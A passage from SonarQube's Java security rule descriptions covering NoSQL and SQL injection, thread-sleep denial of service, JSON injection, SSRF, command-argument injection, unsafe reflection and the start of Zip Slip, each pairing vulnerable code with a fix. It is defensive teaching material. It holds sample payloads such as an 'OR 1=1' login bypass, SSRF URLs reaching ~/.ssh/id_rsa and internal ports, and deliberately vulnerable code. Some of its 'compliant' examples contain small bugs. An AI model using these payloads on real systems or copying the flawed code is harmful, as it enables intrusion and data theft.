  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE). </li>
</ul>
<h2>How to fix it in Legacy Mongo Java API</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to NoSQL injections because untrusted data is concatenated to the <code>$where</code> operator. This operator
indicates to the backend that the expression needs to be interpreted, resulting in code injection.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import com.mongodb.MongoClient;
import com.mongodb.DB;
import com.mongodb.DBCollection;
import com.mongodb.BasicDBObject;

protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws UnknownHostException
{
    String input = req.getParameter("input");

    MongoClient mongoClient = new MongoClient();
    DB database             = mongoClient.getDB("ExampleDatabase");
    DBCollection collection = database.getCollection("exampleCollection");
    BasicDBObject query     = new BasicDBObject();

    query.append("$where", "this.field == \"" + input + "\"");

    collection.find(query);
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import com.mongodb.MongoClient;
import com.mongodb.DB;
import com.mongodb.DBCollection;
import com.mongodb.BasicDBObject;

protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws UnknownHostException
{
    String input = req.getParameter("input");

    MongoClient mongoClient = new MongoClient();
    DB database             = mongoClient.getDB("ExampleDatabase");
    DBCollection collection = database.getCollection("exampleCollection");
    BasicDBObject query     = new BasicDBObject();

    query.append("field", input);

    collection.find(query);
}
</pre>
<h3>How does this work?</h3>
<h4>Pre-approved list</h4>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<p>For NoSQL injections, the cleanest way to do so is to validate the input before using it in a query.</p>
<p>Create a list of authorized and secure strings that you want the application to be able to use in a query.<br> If a user input does not match an
entry in this list, it should be rejected because it is considered unsafe.</p>
<p>The list can be either a regex string, an array, or validators on specific ranges of characters. If you use regexes, choose simple regexes to avoid
ReDOS attacks.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h4>Operators are to be classified as dangerous</h4>
<p>As a rule of thumb if no operators are needed, you should generally reject user input containing them. If some operators are necessary, you should
restrict their use.</p>
<p>Some operators execute JavaScript, and their use should be restricted for both untrusted input and internal code.<br> These operators include:</p>
<ul>
  <li> <code>$where</code> </li>
  <li> <code>$function</code> </li>
  <li> <code>$accumulator</code> </li>
  <li> <code>mapReduce</code> </li>
</ul>
<p>Depending on your use case, you should first try using regular API calls before using any of these operators.<br> For example, using a
<code>$where</code> operator is unnecessarily complex when only a simple search is required. It also leads to performance problems.</p>
<p><strong>Note</strong>: <a href="https://www.mongodb.com/docs/manual/reference/operator/query/where/#javascript-enablement">Server-side scripting
can be disabled</a>.</p>
<p>Regular operators can also lead to data leaks.<br> For example, attackers can use "comparison query operators" in their attack data to trick the
backend database into giving hints about sensitive information or entirely giving it out.</p>
<p>In the previous example, the untrusted data doesn’t need validation for its use case. Moving it out of a <code>$where</code> expression into a
proper field query is enough.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/nosql-injections-in-rocket-chat/">SonarSource, NoSQL Injections in Rocket.Chat 3.12.1</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/943">CWE-943 - Improper Neutralization of Special Elements in Data Query Logic</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S3649">
              javasecurity:S3649
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and
inserts it into a database query without sanitizing it first.</p>
<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is
used.</p>
<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>
<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to SQL injection:<br> After discovering the injection, attackers inject data into the
vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data manipulation</h4>
<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread
impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Chaining DB injections with other vulnerabilities</h4>
<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul>
  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>
  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).
    <ul>
      <li> See <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/">our article on this topic</a> </li>
    </ul>  </li>
</ul>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is an example of an overly simple authentication function. It is vulnerable to SQL injection because user-controlled data is
inserted directly into a query string: The application assumes that incoming data always has a specific range of characters, and ignores that some
characters may change the query logic to a malicious one.</p>
<p>In this particular case, the query can be exploited with the following string:</p>
<pre>
foo' OR 1=1 --
</pre>
<p>By adapting and inserting this template string into one of the fields (<code>user</code> or <code>pass</code>), an attacker would be able to log in
as any user within the scoped user table.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
@RestController
public class ApiController
{
    @Autowired
    Connection connection;

    @GetMapping(value = "/authenticate")
    @ResponseBody
    public ResponseEntity&lt;String&gt; authenticate(
        @RequestParam("user") String user,
        @RequestParam("pass") String pass) throws SQLException
    {
        String query = "SELECT * FROM users WHERE user = '" + user + "' AND pass = '" + pass + "'";

        try (Statement statement = connection.createStatement()) {

            ResultSet resultSet = statement.executeQuery(query);

            if (!resultSet.next()) {
                return new ResponseEntity&lt;&gt;("Unauthorized", HttpStatus.UNAUTHORIZED);
            }
        }

        return new ResponseEntity&lt;&gt;("Authentication Success", HttpStatus.OK);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
@RestController
public class ApiController
{
    @Autowired
    Connection connection;

    @GetMapping(value = "/authenticate")
    @ResponseBody
    public ResponseEntity&lt;String&gt; authenticate(
        @RequestParam("user") String user,
        @RequestParam("pass") String pass) throws SQLException
    {
        String query = "SELECT * FROM users WHERE user = ? AND pass = ?";

        try (PreparedStatement statement = connection.prepareStatement(query)) {
            statement.setString(1, user);
            statement.setString(2, pass);

            ResultSet resultSet = statement.executeQuery(query);

            if (!resultSet.next()) {
                return new ResponseEntity&lt;&gt;("Unauthorized", HttpStatus.UNAUTHORIZED);
            }
        }

        return new ResponseEntity&lt;&gt;("Authentication Success", HttpStatus.OK);
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Use prepared statements</h4>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an
interpreted context.</p>
<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br> Here is an example with the
following query string (Java SE syntax):</p>
<pre>
SELECT * FROM users WHERE user = ? AND pass = ?
</pre>
<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol '?' was used as
a placeholder.</strong></p>
<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals
corresponding to the placeholders to the database.<br> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and
some do not - because they do it transparently.</p>
<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>
<p>After compilation, the query logic is frozen and cannot be changed.<br> So when the application passes the literals that replace the placeholders,
they are not considered application logic by the database.</p>
<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes
them.</p>
<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a
query. An attacker who controls this third-party data can cause the database to execute malicious code.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/">SonarSource, Exploiting Hibernate Injections</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP, SQL Injection Prevention Cheat
  Sheet</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/89">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ITdGBQ">CERT, IDS00-J.</a> - Prevent SQL injection </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6390">
              javasecurity:S6390
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Most modern applications use threads to handle incoming requests or other long-running tasks concurrently. In some cases, the number of concurrent
threads is limited to avoid system resource exhaustion due to too numerous actions being run.</p>
<p>When an application uses user-controlled data as a parameter of a thread suspension operation, a Denial of Service attack can be made possible.</p>
<h3>What is the potential impact?</h3>
<p>An attacker with the capability to insert an arbitrary duration into a thread suspension operation could suspend the corresponding thread for a
long time. Depending on the application’s architecture and the thread handling logic, this can lead to a complete Denial of Service of the
application.</p>
<p>Indeed, if the number of threads, either created by the application or allocated by a web server, is limited, the attacker will be able to suspend
all of them at the same time. Without any remaining thread to handle actions, the application might badly answer, be slowed down, or become completely
irresponsive.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>This code is vulnerable to a Denial of Service because it sets a thread’s suspension time from user input without prior validation or
sanitation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        Long time = Long.parseLong(req.getParameter("time"));
        try {
            Thread.sleep(time); // Noncompliant
        } catch (InterruptedException e) {
            resp.sendError(500);
        }
    }
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
protected void compliant(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        Long time = Long.parseLong(req.getParameter("time"));
        try {
            Thread.sleep(Math.min(time, 1000));
        } catch (InterruptedException e) {
            resp.sendError(500);
        }
    }
</pre>
<h3>How does this work?</h3>
<p>In most cases, it is discouraged to define a thread suspension time from user-input.</p>
<p>If really necessary, the application should ensure that the provided suspension time is below a safe limit. Such a limit should be evaluated and
set to the lowest possible time that ensures the application’s operation and restricts denial of service attacks.</p>
<p>The example compliant code uses the <code>Math.min</code> function to ensure the suspension duration is below the limit of one second.</p>
<p>Note that even when the suspension time is limited, an attacker who submits numerous requests at high speed can still manage always to consume all
available threads.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6398">
              javasecurity:S6398
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>JSON injections occur when an application builds a JSON-formatted string from user input without prior validation or sanitation. In such a case, a
tainted user-controlled value can tamper with the JSON string content. Especially, unexpected arbitrary elements can be inserted in the corresponding
JSON object. Those modifications can include:</p>
<ul>
  <li> Adding additional keys to a JSON dictionary. </li>
  <li> Changing values types. </li>
  <li> Adding elements in an array. </li>
</ul>
<p>A malicious user-supplied value can perform other modifications depending on where and how the constructed data is later used.</p>
<h3>What is the potential impact?</h3>
<p>The consequences of a JSON injection attack into an application vary greatly depending on the application’s logic. It can affect the application
itself or another element if the JSON string is used for cross-component data exchange. For this reason, the actual impact can range from benign
information disclosure to critical remote code execution.</p>
<h4>Information disclosure</h4>
<p>An attacker can forge an attack payload that will modify the JSON string so that it will become syntactically incorrect. In that case, when the
data is later used, the parsing component will raise a technical error. If displayed back to the attacker or made available through log files, this
technical error may disclose sensitive business or technical information.</p>
<p>This scenario, while in general the less severe one, is the most frequently encountered. It can combine with any other logic-dependant threat.</p>
<h4>Privilege escalation</h4>
<p>An application that would rely on JSON to store or propagate users' authentication levels and roles would be under threat of privilege escalations.
Indeed, an attacker could tamper with the permissions storage object to insert arbitrary roles or privileges.</p>
<p>While highly specific, similar issues can be faced in the following situations:</p>
<ul>
  <li> An application builds JSON payloads for HTTP requests. </li>
  <li> An application builds JWT from user input. </li>
</ul>
<h4>Code execution</h4>
<p>An application might build objects based on a JSON serialization string. In that case, an attacker that would exploit a JSON injection could be
able to alter the serialization string to modify the corresponding object’s properties.</p>
<p>Depending on the deserialization process, this might allow instantiating arbitrary objects or objects with sensitive properties altered. This can
lead to arbitrary code being executed in the same way as a deserialization injection vulnerability.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to a JSON injection vulnerability because it builds a JSON string from user input without prior sanitation or
validation. Therefore, an attacker can submit a tainted value that will tamper with the corresponding JSON object structure.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="21" data-diff-type="noncompliant">
import org.json.JSONObject;

public void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    try {
        String tainted = request.getParameter("value");
        String json = "{\"key\":\""+ tainted +"\"}";
        JSONObject obj = new JSONObject(json); // Noncompliant
    } catch (JsonException e) {
        resp.sendError(400)
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="21" data-diff-type="compliant">
import org.json.JSONObject;

public void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    JSONObject obj = new JSONObject(json);
    obj.put("key", request.getParameter("value"));
}
</pre>
<h3>How does this work?</h3>
<p>In most cases, it is discouraged to build JSON strings with a direct concatenation of user input. While not always possible, a strong pattern-based
validation can help sanitize tainted inputs. Likewise, converting to a harmless type can sometimes be a solution.</p>
<p>However, avoiding handling objects' properties as strings by directly constructing Java objects should be the preferred way.</p>
<h4>Programmatic object building</h4>
<p>In most cases, an application can directly create objects from user input without having to build and parse a JSON string. Doing so prevents
injection vulnerabilities as JSON object construction libraries and functions will properly escape and check the type of input values.</p>
<p>Sometimes, the application might need to include the user input in an object built from a trusted JSON string. In that case, the recommended
solution is to parse the trusted string first and then programmatically modify the resulting object.</p>
<p>The example compliant code uses the <code>org.json</code> libraries capabilities to dynamically build a JSON object without string parsing.</p>
<h4>Converting to a harmless type</h4>
<p>When the application allows it, converting user-submitted data to a harmless type can help prevent JSON injection vulnerabilities. In particular,
converting user inputs to numeric types is an efficient sanitation mechanism.</p>
<p>This mechanism can be extended to other types, including more complex ones. However, care should be taken when dealing with them, as manually
validating or sanitizing complex types can represent a challenge.</p>
<p>Note that choosing this solution can be error-prone: every user input has to be validated or sanitized without oversight.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://www.talosintelligence.com/vulnerability_reports/TALOS-2018-0556">CVE-2018-3879 - An exploitable JSON injection
  vulnerability</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/76">CWE-76 - Improper Neutralization of Equivalent Special Elements</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5144">
              javasecurity:S5144
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br></p>
<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be
treated in the same way as basic SSRF.</p>
<h3>What is the potential impact?</h3>
<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to
what is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>
<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can
range from low to critical severity.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Local file read to host takeover</h4>
<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File
URI scheme <code>file://</code>.<br> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web
application.</p>
<h4>Internal Network Reconnaissance</h4>
<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port
field in the URL <code>http://127.0.0.1:{port}</code>.<br> Taking advantage of other supported URL schemas (dependent on the affected system), for
example, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to SSRF as it performs an HTTP request to a URL defined by untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    String location = req.getParameter("url");

    URL url = new URL(location);

    HttpURLConnection  conn = (HttpURLConnection) url.openConnection();
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    String location = req.getParameter("url");

    List&lt;String&gt; allowedHosts = new ArrayList&lt;String&gt;();
    allowedHosts.add("https://trusted1.example.com/");
    allowedHosts.add("https://trusted2.example.com/");

    URL url = new URL(location);

    if (allowedHosts.contains(location))
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
}
</pre>
<h3>How does this work?</h3>
<h4>Pre-Approved commands</h4>
<p>Create a list of authorized and secure URLs that you want the application to be able to request.<br> If a user input does not match an entry in
this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h3>Pitfalls</h3>
<h4>The trap of 'StartsWith' and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>
<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith("https://example.com")</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.commit.malicious.io</code>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">Top 10 2021 Category A10 - Server-Side Request
  Forgery (SSRF)</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/918">CWE-918 - Server-Side Request Forgery (SSRF)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6350">
              javasecurity:S6350
            </a>
          </td>
          <td>
            <details>
              <p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9920">CVE-2016-9920</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29472">CVE-2021-29472</a> </li>
</ul>
<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the
programs. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing
files into specific directories.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Malicious arguments can result in undesired behavior in the executed command. </li>
  <li> Passing user input to a system command is not necessary. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid constructing system commands from user input when possible. </li>
  <li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li>
  <li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in
vulnerabilities:</p>
<pre>
String input = request.getParameter("input");
String cmd[] =  new String[] { "/usr/bin/find", input };
Runtime.getRuntime().exec(cmd); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Use an allow-list to restrict the arguments to trusted values:</p>
<pre>
String input = request.getParameter("input");
if (allowed.contains(input)) {
  String cmd[] =  new String[] { "/usr/bin/find", input };
  Runtime.getRuntime().exec(cmd);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/88">CWE-88 - Argument Injection or Modification</a> </li>
  <li> <a href="https://blog.sonarsource.com/php-supply-chain-attack-on-composer">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6173">
              javasecurity:S6173
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Reflection injections occur in a web application when it retrieves data from a user or a third-party service and fully or partially uses it to
inspect, load or invoke a component by name.</p>
<p>If an application uses a reflection method in a way that is vulnerable to injections, it is exposed to attacks that aim to achieve remote code
execution on the server’s website.</p>
<p>A user with malicious intent exploits this by carefully crafting a string involving symbols such as class methods, that will help them change the
initial reflection logic to an impactful malicious one.</p>
<p>After creating the malicious request and triggering it, the attacker can attack the servers affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>If user-supplied values are used to choose which code is executed, an attacker may be able to supply carefully-chosen values that cause unexpected
code to run. The attacker can use this ability to run arbitrary code on the server.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Application-specific attacks</h4>
<p>In this scenario, the attackers succeed in injecting a seemingly-legitimate object, but whose properties might be used maliciously.</p>
<p>Depending on the application, attackers might be able to modify important data structures or content to escalate privileges or perform unwanted
actions. For example, with an e-commerce application, this could be changing the number of products or prices.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in injecting an object triggering code execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul>
  <li> Download the internal server’s data, most likely to sell it. </li>
  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>
  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to
elevate their privileges as an administrator and attack other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
through a combination of unsafe deserialization and misconfiguration:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>In the following example, the code simulates a feature in an image editing application that allows users to install plugins to add new filters or
effects. It assumes the user will give a known name, such as "SepiaEffect".</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import java.lang.Class;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

@RestController
public class EffectController
{
    @GetMapping(value = "/filter/apply")
    @ResponseBody
    public ResponseEntity&lt;String&gt; apply(@RequestParam("effect") String effectName)
    {
        try
        {
            Class effectClass                = Class.forName(effectName);  // Noncompliant
            Constructor&lt;?&gt; effectConstructor = effectClass.getConstructor();
            Object EffectObject              = effectConstructor.newInstance();
            Method applyMethod               = effectClass.getMethod("applyFilter");

            boolean result = (boolean) applyMethod.invoke(EffectObject);

            if (result) {
                return new ResponseEntity&lt;&gt;("Filter Applied", HttpStatus.OK);
            }

        } catch (Exception e) {}

        return new ResponseEntity&lt;&gt;("Filter Failure", HttpStatus.FORBIDDEN);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import java.lang.Class;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

@RestController
public class EffectController
{
    private static Set&lt;String&gt; EFFECT_ALLOW_LIST = new HashSet&lt;&gt;();

    static
    {
        allowList.add("SepiaEffect");
        allowList.add("BlackAndWhiteEffect");
        allowList.add("WaterColorEffect");
        allowList.add("OilPaintingEffect");
    }

    @GetMapping(value = "/filter/apply")
    @ResponseBody
    public ResponseEntity&lt;String&gt; apply(@RequestParam("effect") String effectName)
    {
        if (!EFFECT_ALLOW_LIST.contains(effectName)) {
            return new ResponseEntity&lt;&gt;("Filter Failure", HttpStatus.FORBIDDEN);
        }

        try
        {
            Class effectClass                = Class.forName(effectName);
            Constructor&lt;?&gt; effectConstructor = effectClass.getConstructor();
            Object EffectObject              = effectConstructor.newInstance();
            Method applyMethod               = effectClass.getMethod("applyFilter");

            boolean result = (boolean) applyMethod.invoke(EffectObject);

            if (result) {
                return new ResponseEntity&lt;&gt;("Filter Applied", HttpStatus.OK);
            }

        } catch (Exception e) {}

        return new ResponseEntity&lt;&gt;("Filter Failure", HttpStatus.FORBIDDEN);
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Pre-Approved commands</h4>
<p>The cleanest way to avoid this defect is to validate the input before using it in a reflection method.</p>
<p>Create a list of authorized and secure classes that you want the application to be able to execute.<br> If a user input does not match an entry in
this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/470">CWE-470 - Use of Externally-Controlled Input to Select Classes or Code ('Unsafe
  Reflection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6096">
              javasecurity:S6096
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Zip slip is a special case of path injection. It occurs when an application uses the name of an archive entry to construct a file path and access
this file without validating its path first.</p>
<p>This rule will consider all archives untrusted, assuming they have been created outside the application file system.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, in the archive entry name to change the initial
intended path. The resulting path would resolve somewhere in the filesystem where the user should not normally have access.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to Zip Slip and an attacker is able to exploit it by submitting an archive he controls.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override arbitrary files</h4>
<p>The application opens the archive to copy its entries to the file system. The entries' names contain path traversal payloads for existing files in
the system, which are overwritten once the entries are copied. The vulnerability is exploited to corrupt files critical for the application or
operating system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Zip Slip as it is constructing a path using an archive entry name. This path is then used to copy a file
without being validated first. Therefore, it can be leveraged by an attacker to overwrite arbitrary files.</p>
